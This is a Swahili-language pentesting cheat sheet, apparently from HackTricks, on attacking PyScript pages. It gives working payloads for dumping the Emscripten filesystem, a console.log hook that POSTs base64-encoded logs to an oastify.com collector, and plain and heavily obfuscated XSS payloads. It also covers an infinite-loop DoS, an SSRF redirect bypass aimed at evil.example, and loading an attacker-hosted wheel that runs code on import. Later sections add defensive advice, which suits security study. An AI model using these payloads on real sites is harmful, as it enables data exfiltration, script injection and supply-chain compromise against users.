# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## Mwongozo wa PyScript Pentesting

PyScript ni framework mpya iliyoundwa kwa ajili ya kuunganisha Python kwenye HTML, hivyo inaweza kutumika pamoja na HTML. Katika cheat sheet hii, utapata jinsi ya kutumia PyScript kwa madhumuni yako ya pentesting.

### Kudump / Kupata files kutoka kwenye mfumo wa faili wa virtual memory wa Emscripten:

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Code:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
Result:

![Mwongozo wa PyScript Pentesting - Dumping / Retrieving files kutoka kwenye Emscripten virtual memory filesystem: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [OOB Data Exfiltration ya Emscripten virtual memory filesystem (ufuatiliaji wa console)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Code:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
Matokeo:

![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Kawaida)

Msimbo:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
Matokeo:

![OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

Code:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
Result:

![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

Code:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
Matokeo:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (Infinity loop)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS attack (Infinity loop)

Code:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
Matokeo:

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Vulnerabilities na techniques mpya (2023-2025)

### Server-Side Request Forgery kupitia uncontrolled redirects (CVE-2025-50182)

`urllib3 >= 2.2.0, < 2.5.0` hupuuza request parameters za `redirect` na `retries` inapotumiwa pamoja na browser transport ya Pyodide. Ikiwa attacker anaweza kuathiri target URLs, code inaweza kufuata cross-domain redirects hata inapoiomba urllib3 kuzizima, hivyo kudhoofisha SSRF defenses.<sup>[[1]](#references)[[4]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager()
r = http.request(
"GET",
"https://evil.example/302",
retries=False,
redirect=False,
)  # ignored by affected Pyodide/browser runtimes
print(r.status, r.url)
</script>
```
Pata toleo la `urllib3 >= 2.5.0` kwa Node.js, lakini usitegemee urllib3 kuzima redirects katika vivinjari; badala yake, validate au allow-list destinations kabla ya kufanya requests.<sup>[[4]](#references)</sup>

### Upakiaji wa packages kiholela na supply-chain attacks

Usanidi wa Pyodide wa PyScript unakubali wheel URLs kiholela katika `packages`; ikiwa attacker anaweza kurekebisha au kuingiza usanidi huo, import inayofuata inaweza kutekeleza Python inayodhibitiwa na attacker katika browser ya victim.<sup>[[5]](#references)[[6]](#references)</sup>
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code at import
</script>
```
Pyodide inaweza kusakinisha pure-Python wheels kutoka URLs za kiholela bila build ya WebAssembly ya package.<sup>[[6]](#references)</sup> Weka configuration hii chini ya udhibiti wa developer, ruhusu majina halisi ya packages au URLs pekee, na uthibitishe remote wheel digests wakati wa build au deployment.

### Mabadiliko ya output sanitisation (2023+)

* Katika implementation ya 2022.05.1 iliyotumiwa na mifano ya zamani, `print()` huandika output ya `text/plain` bila HTML escaping na hivyo iko hatarini kwa XSS.<sup>[[8]](#references)</sup>
* `display()` helper ya sasa **hufanya HTML escaping kwa default** kwa plain strings; raw markup lazima ifungwe ndani ya `pyscript.HTML()`.<sup>[[2]](#references)</sup>
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Tumia `display()` kwa input isiyoaminika na usipitishie strings zisizoaminika kwenye `HTML()`.<sup>[[2]](#references)</sup>

---

## Mbinu Bora za Kujilinda

* **Weka packages katika hali ya kisasa** – tumia `urllib3 >= 2.5.0` katika Node.js na kagua assumptions za browser redirect kando.<sup>[[4]](#references)</sup>
* **Zuia vyanzo vya packages** – ruhusu kwa allow-list majina ya PyPI au URLs sahihi zinazoaminika, na thibitisha digests za wheel za mbali wakati wa build au deployment.<sup>[[5]](#references)[[6]](#references)</sup>
* **Imarisha Content Security Policy** – kataza JavaScript ya ndani (`script-src 'self' 'sha256-…'`) ili blocks za `<script>` zilizoingizwa zisiweze kutekelezwa.
* **Kataza tags za `<py-script>` / `<script type="py">` zinazotolewa na mtumiaji** – safisha HTML kwenye server kabla ya kuirudisha kwa watumiaji wengine.
* **Tenga workers** – ikiwa huhitaji ufikiaji wa synchronous wa DOM kutoka kwa workers, wezesha flag ya `sync_main_only` ili kuepuka `SharedArrayBuffer` na mahitaji yake yanayohusiana na headers za CORS.<sup>[[5]](#references)</sup>

## References

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [Nyaraka za Built-ins za PyScript – `display` na `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - Sanaa ya Kuunganisha Vulnerabilities (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
- [4] [Ushauri wa usalama wa urllib3 – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
- [5] [Nyaraka za configuration za PyScript – packages na `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
- [6] [Pyodide – Kupakia packages](https://pyodide.org/en/stable/usage/loading-packages.html)
- [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
- [8] [Utekelezaji wa `pyscript.py` wa PyScript 2022.05.1](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
{{#include ../../banners/hacktricks-training.md}}
